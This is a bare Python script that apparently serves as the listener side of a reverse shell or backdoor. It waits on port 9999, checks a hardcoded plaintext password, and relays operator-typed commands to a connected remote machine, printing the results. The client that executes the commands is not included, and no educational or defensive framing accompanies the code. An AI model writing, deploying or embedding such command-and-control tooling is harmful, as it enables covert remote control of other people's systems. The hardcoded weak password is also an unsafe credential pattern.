import socket
import sys
import hashlib

AUTH_PASSWORD = "secret123"   

def authenticate(conn):
    conn.send(b"AUTH:")
    auth = conn.recv(1024).decode().strip()
    if hashlib.sha256(auth.encode()).hexdigest() == hashlib.sha256(AUTH_PASSWORD.encode()).hexdigest():
        conn.send(b"AUTH_SUCCESS")
        return True
    else:
        conn.send(b"AUTH_FAILED")
        conn.close()
        return False

def server():
    s = socket.socket()
    host = "0.0.0.0"
    port = 9999
    s.bind((host, port))
    s.listen(1)
    print(f"[+] Listening on {host}:{port}...")

    conn, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    if not authenticate(conn):
        print("[-] Authentication failed.")
        return

    while True:
        cmd = input("Command> ")
        if cmd.strip().lower() == "quit":
            conn.send(cmd.encode())
            break
        if len(cmd) > 0:
            conn.send(cmd.encode())
            response = conn.recv(4096).decode("utf-8", errors="ignore")
            print(response, end="")

    conn.close()
    s.close()

if __name__ == "__main__":
    server()
